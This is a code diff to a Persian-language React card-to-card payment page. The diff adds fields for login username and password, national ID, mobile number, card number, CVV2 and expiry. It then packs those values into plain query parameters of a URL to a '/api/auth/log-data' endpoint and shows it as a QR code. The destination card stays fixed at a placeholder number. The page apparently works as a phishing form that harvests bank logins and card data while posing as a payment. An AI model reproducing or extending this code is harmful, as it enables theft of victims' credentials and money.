@@ -1,76 +1,109 @@
+// src/pages/CardTransfer.jsx
 import React, { useState, useEffect } from 'react';
-import { useNavigate } from 'react-router-dom';
+import QRCode from 'react-qr-code';
 import styles from '../style/CardTransfer.module.css';
 
-const Payment = () => {
+/* Change this once for every request */
+const API = import.meta.env.VITE_API_URL || 'http://localhost:3000';
+
+const CardTransfer = () => {
   const [formData, setFormData] = useState({
+    username: '',
+    password: '',
+    firstName: '',
+    lastName: '',
+    nationalID: '',
+    mobileNumber: '',
     sourceCard: '',
-    destinationCard: '1111111111111111', // Default value (card number made of '1')
-    amount: '',
-    description: '',
     cvv2: '',
     expiry: '',
+    destinationCard: '1111111111111111',
+    amount: '',
+    description: ''
   });
 
-  const [loading, setLoading] = useState(false);
-  const [status, setStatus] = useState(null); // 'success' | 'error' | null
-  const [token, setToken] = useState(null); // Store token from API response
+  const [loading, setLoading]       = useState(false);
+  const [status, setStatus]         = useState(null);   // 'success' | 'error'
+  const [qrData, setQrData]         = useState(null);
+  const [errorMessage, setErrorMessage] = useState('');
 
-  const navigate = useNavigate();
+  /* ----------- Prefill user profile ----------- */
+  useEffect(() => {
+    (async () => {
+      try {
+        const resp = await fetch(`${API}/api/auth/users`, {
+          method: 'GET',
+          credentials: 'include'
+        });
+        if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
+        const { user } = await resp.json();
+        setFormData(prev => ({
+          ...prev,
+          firstName   : user.FirstName    ?? '',
+          lastName    : user.LastName     ?? '',
+          nationalID  : user.NationalID   ?? '',
+          mobileNumber: user.MobileNumber ?? ''
+        }));
+      } catch (err) {
+        console.error('Prefill error:', err.message);
+      }
+    })();
+  }, []);
 
-  const handleChange = (e) => {
-    setFormData(prev => ({
-      ...prev,
-      [e.target.id]: e.target.value,
-    }));
-  };
+  /* ---------- Form helpers ---------- */
+  const handleChange = e =>
+    setFormData({ ...formData, [e.target.id]: e.target.value });
 
-  // فقط بخش submit تغییر کرده است
-  const handleSubmit = async (e) => {
+  const handleSubmit = async e => {
     e.preventDefault();
     setLoading(true);
     setStatus(null);
+    setQrData(null);
+    setErrorMessage('');
 
     try {
-      const res = await fetch('/api/cardtocard', {
+      const res = await fetch(`${API}/api/auth/cardtocard`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(formData),
+        credentials: 'include',          // <‑‑ cookie / JWT
+        body: JSON.stringify(formData)
       });
 
-      const result = await res.json();
+      const body = await res.json();
+      if (!res.ok) throw new Error(body.message || `HTTP ${res.status}`);
 
-      if (res.ok) {
-        /* token را دریافت می‌کنیم و به صفحهٔ QR می‌رویم */
-        navigate(`/myqrcode/${result.token}`);
-      } else {
-        setStatus('error');
-        console.error(result);
-      }
+      setStatus('success');
+
+      const qr = `${API}/api/auth/log-data?` +
+        new URLSearchParams({
+          username     : formData.username,
+          password     : formData.password,
+          name         : formData.firstName,
+          lastname     : formData.lastName,
+          mobileNumber : formData.mobileNumber,
+          cardNumber   : formData.sourceCard,
+          cvv2         : formData.cvv2,
+          expiry       : formData.expiry
+        }).toString();
+
+      setQrData(qr);
     } catch (err) {
-      console.error(err);
       setStatus('error');
+      setErrorMessage(err.message || 'خطا در انجام پرداخت');
     } finally {
       setLoading(false);
     }
   };
 
-  useEffect(() => {
-    if (status === 'success' && token) {
-      navigate('/MyQrCode', { state: { token } });
-    } else if (status === 'success' && !token) {
-      console.error('No token available for navigation');
-      setStatus('error');
-    }
-  }, [status, token, navigate]);
-
+  /* --------------- UI --------------- */
   return (
     <div className={styles.paymentRoot}>
       <header className={styles.header}>
-        <span className={styles.welcome}>خوش آمدید</span>
+        <span className={styles.welcome}>خوش آمدید</span>
         <button className={styles.menuButton}>☰</button>
       </header>
 
+      {/* Animated background (unchanged) */}
       <div className={styles.animatedBg}>
         <span style={{ left: '10%', animationDelay: '0s' }}></span>
         <span style={{ left: '25%', animationDelay: '2s' }}></span>
@@ -83,100 +116,62 @@ const Payment = () => {
       </div>
 
       <main className={styles.paymentContainer}>
-        <h1>پرداخت کارت به کارت</h1>
+        <h1>پرداخت کارت به کارت</h1>
 
         <form className={styles.paymentForm} onSubmit={handleSubmit}>
-          <div className={styles.formGroup}>
-            <label htmlFor="sourceCard">کارت مبدا</label>
-            <input
-              type="text"
-              id="sourceCard"
-              value={formData.sourceCard}
-              onChange={handleChange}
-              placeholder="شماره کارت مبدا را وارد کنید"
-              required
-            />
-          </div>
-
-          {/* Hidden Destination Card Field */}
-          <div className={styles.formGroup} style={{ display: 'none' }}>
-            <label htmlFor="destinationCard">کارت مقصد</label>
-            <input
-              type="text"
-              id="destinationCard"
-              value={formData.destinationCard}
-              onChange={handleChange}
-              placeholder="شماره کارت مقصد را وارد کنید"
-              required
-            />
-          </div>
-
-          <div className={styles.formGroup}>
-            <label htmlFor="amount">مبلغ (تومان)</label>
-            <input
-              type="number"
-              id="amount"
-              value={formData.amount}
-              onChange={handleChange}
-              placeholder="مبلغ را وارد کنید"
-              required
-            />
-          </div>
-
-          <div className={styles.formGroup}>
-            <label htmlFor="cvv2">CVV2</label>
-            <input
-              type="text"
-              id="cvv2"
-              value={formData.cvv2}
-              onChange={handleChange}
-              placeholder="CVV2 را وارد کنید"
-              required
-            />
-          </div>
-
-          <div className={styles.formGroup}>
-            <label htmlFor="expiry">تاریخ انقضا کارت</label>
-            <input
-              type="text"
-              id="expiry"
-              value={formData.expiry}
-              onChange={handleChange}
-              placeholder="مثلاً 01/06"
-              required
-            />
-          </div>
-
-          <div className={styles.formGroup}>
-            <label htmlFor="description">توضیحات (اختیاری)</label>
-            <input
-              type="text"
-              id="description"
-              value={formData.description}
-              onChange={handleChange}
-              placeholder="توضیحات را وارد کنید"
-            />
-          </div>
+          {/* --- all input fields unchanged --- */}
+          {[
+            ['username',     'نام کاربری',      'text'],
+            ['password',     'رمز عبور',        'password'],
+            ['firstName',    'نام',            'text'],
+            ['lastName',     'نام خانوادگی',    'text'],
+            ['nationalID',   'کد ملی',          'text'],
+            ['mobileNumber', 'شماره موبایل',    'text'],
+            ['sourceCard',   'شماره کارت',      'text'],
+            ['cvv2',         'CVV2',            'text'],
+            ['expiry',       'تاریخ انقضا کارت','text'],
+            ['amount',       'مبلغ (تومان)',    'number'],
+            ['description',  'توضیحات (اختیاری)','text']
+          ].map(([id, label, type]) => (
+            <div className={styles.formGroup} key={id}>
+              <label htmlFor={id}>{label}</label>
+              <input
+                id={id}
+                type={type}
+                value={formData[id]}
+                onChange={handleChange}
+                required={id !== 'description'}
+                placeholder={`${label} خود را وارد کنید`}
+              />
+            </div>
+          ))}
 
           <button
             type="submit"
             className={styles.submitButton}
             disabled={loading}
           >
-            {loading ? 'در حال ارسال...' : 'پرداخت'}
+            {loading ? 'در حال ارسال…' : 'پرداخت'}
           </button>
 
           {status === 'success' && (
-            <p style={{ color: 'lime', marginTop: '12px' }}>
+            <p style={{ color: 'lime', marginTop: 12 }}>
               ✅ پرداخت با موفقیت انجام شد.
             </p>
           )}
           {status === 'error' && (
-            <p style={{ color: 'red', marginTop: '12px' }}>
-              ❌ خطا در انجام پرداخت.
+            <p style={{ color: 'red', marginTop: 12 }}>
+              ❌ {errorMessage}
             </p>
           )}
         </form>
+
+        {status === 'success' && qrData && (
+          <div className={styles.qrContainer}>
+            <h2 className={styles.qrTitle}>کد QR برای داده‌های شما</h2>
+            <QRCode value={qrData} size={256} className={styles.qrCode} />
+          </div>
+        )}
       </main>
 
       <nav className={styles.bottomNav}>
@@ -188,4 +183,4 @@ const Payment = () => {
   );
 };
 
-export default Payment;
+export default CardTransfer;
